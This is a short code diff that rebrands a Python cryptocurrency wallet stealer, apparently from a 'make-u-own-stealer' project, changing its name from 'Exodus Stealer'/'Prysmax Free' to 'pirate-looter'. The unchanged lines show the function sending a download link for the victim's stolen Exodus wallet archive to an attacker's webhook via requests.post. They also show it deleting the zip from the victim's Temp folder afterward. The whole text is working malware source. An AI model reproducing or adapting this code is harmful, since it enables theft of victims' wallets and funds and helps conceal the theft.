@@ -14,10 +14,10 @@ def exo():
   
   me = {
     "avatar_url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
-    "username": "Prysmax Free",
+    "username": "pirate-looter",
     "embeds": [
         {
-            "title": "Exodus Stealer",
+            "title": "pirate-looter",
             "fields": [
                 {
                     "name": "Download Link",
@@ -25,7 +25,7 @@ def exo():
                     "inline": True
                 },
                 {
-                    "name": "Exodus Found",
+                    "name": "pirate-looter Found",
                     "value": f"`Yes\n`",
                     "inline": True
                 }
@@ -42,7 +42,7 @@ def exo():
     "Content-Type": "application/json"}
   r = requests.post(hook,data=me)
   try:
-   os.remove(user+"\\AppData\\Local\\Temp\\Exodus.zip")
-   os.remove(user+"\\AppData\\Local\\Temp\\Exodus")
+   os.remove(user+"\\AppData\\Local\\Temp\\pirate-looter.zip")
+   os.remove(user+"\\AppData\\Local\\Temp\\pirate-looter")
   except:
     pass
